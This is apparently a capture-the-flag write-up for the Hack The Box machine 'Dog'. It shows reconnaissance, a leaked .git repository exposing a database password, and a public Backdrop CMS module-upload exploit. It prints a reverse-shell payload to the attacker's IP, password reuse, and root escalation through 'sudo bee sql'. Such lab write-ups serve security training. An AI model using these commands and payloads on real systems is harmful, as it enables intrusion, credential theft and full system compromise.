# User flag 
## 1. rustscan 
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git: 
|   10.129.112.192:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## 2. git dump
```bash
┌──(git-dumper)─(kali㉿kali)-[~/Tools/linux/git-dumper]
└─$ python3 git_dumper.py http://dog.htb/ website

┌──(kali㉿kali)-[~/Tools/linux/git-dumper/website]
└─$ ls
LICENSE.txt  README.md  core

┌──(git-dumper)─(kali㉿kali)-[~/Tools/linux/git-dumper/website]
└─$ git log   
commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD, master)
Author: root <dog@dog.htb>
Date:   Fri Feb 7 21:22:11 2025 +0000

    todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases

┌──(git-dumper)─(kali㉿kali)-[~/Tools/linux/git-dumper/website]
└─$ git ls-tree  8204779c764abd4c9d8d95038b6d22b6a7515afa
100755 blob d159169d1050894d3ea3b98e1c965c4058208fe1    LICENSE.txt
100755 blob d93d66b3bdc7ffa2dbf42b1fcfe20f62df15cec0    README.md
040000 tree d6dda33ea64287ab76f6a9b4404e9e04dbf67b7b    core
040000 tree c99fe269d56a8d1e08bd389e7a032ef2f7905cad    files
100755 blob 0e3f55a9f2854d40d5ddc4aca36ae21f6ea489f0    index.php
040000 tree f83230fa2cf180e5b75334dd677e1b5d4d31123b    layouts
100755 blob 271227dab979723b23bc53f3125966f4382a7803    robots.txt
100755 blob 5144053b7a821d02460db2e902007a20004dfa16    settings.php
040000 tree d79f5db75c47c00c9a73ec324145218410e17f00    sites
040000 tree 5f2f486f1a71b32f07a060e1e731cfe02e047ed0    themes

# read README.md
# find out it use Backdrop
┌──(git-dumper)─(kali㉿kali)-[~/Tools/linux/git-dumper/website]
└─$ git cat-file -p d93d66b3bdc7ffa2dbf42b1fcfe20f62df15cec0
Backdrop is a full-featured content management system that allows non-technical
users to manage a wide variety of content. It can be used to create all kinds of
websites including blogs, image galleries, social networks, intranets, and more.

# find backdrop version
┌──(git-dumper)─(kali㉿kali)-[~/…/linux/git-dumper/website/core]
└─$ grep -r version
layouts/legacy/one_column/one_column.info:version = BACKDROP_VERSION
layouts/legacy/one_column/one_column.info:version = 1.27.1
layouts/legacy/two_column/two_column.info:version = BACKDROP_VERSION
layouts/legacy/two_column/two_column.info:version = 1.27.1

# read settings.php
┌──(git-dumper)─(kali㉿kali)-[~/Tools/linux/git-dumper/website]
└─$ git cat-file -p 5144053b7a821d02460db2e902007a20004dfa16

<SNIP>
/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
<SNIP>

```
## 3. dirsearch
```python 
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ dirsearch -u http://dog.htb -e* -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                
                                                                                                                                       
Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz | HTTP method: GET | Threads: 25 | Wordlist size: 220544

Output File: /home/kali/Desktop/htb/reports/http_dog.htb/_25-03-11_02-26-04.txt

Target: http://dog.htb/

[02:26:04] Starting:                                                                                                                   
[02:26:20] 301 -  302B  - /files  ->  http://dog.htb/files/                 
[02:26:21] 301 -  303B  - /themes  ->  http://dog.htb/themes/               
[02:26:21] 301 -  304B  - /modules  ->  http://dog.htb/modules/ 
```

* http://dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json
![[Pasted image 20250311144552.png]]

```
creds: tiffany@dog.htb:BackDropJ2024DS2024
```
![[Pasted image 20250311144734.png]]
## 4. Exploit
=> find this https://www.exploit-db.com/exploits/52021
```bash
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ python3 shell.py http://dog.htb
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://dog.htb/modules/shell/shell.php

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ unzip shell.zip

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ tar -cvf shell.tar shell               
shell/
shell/shell.info
shell/shell.php

# upload and install 
```
![[Pasted image 20250311145605.png]]
payload: `
```
http://dog.htb/modules/shell/shell.php?cmd=%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.73%2F443+0%3E%261%22
```

shell upgrad:
```bash 
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ n443
listening on [any] 443 ...
connect to [10.10.14.73] from (UNKNOWN) [10.129.112.246] 49118
bash: cannot set terminal process group (1010): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/shell$ which python3
which python3
/usr/bin/python3

www-data@dog:/var/www/html/modules/shell$ cd /
www-data@dog:/$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@dog:/$ export term=XTERM

# enum users
www-data@dog:/$ cat /etc/passwd | grep 'sh'
cat /etc/passwd | grep 'sh'
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash

# try password reuse
www-data@dog:/$ su johncusack 
su johncusack
Password: BackDropJ2024DS2024
johncusack@dog:~$ ls
ls
user.txt
```

# root flag
### 1. sudo -l
```bash

johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

johncusack@dog:~$ /usr/local/bin/bee

<snip> 
 ADVANCED
  sql
   sqlc, sql-cli, db-cli
   Open an SQL command-line interface using Backdrop\'s database credentials.

# shell
johncusack@dog:~$ cd /var/www/html
johncusack@dog:/var/www/html$ sudo bee sql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 47
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> system id;
uid=0(root) gid=0(root) groups=0(root)
mysql> system ls /root
root.txt
```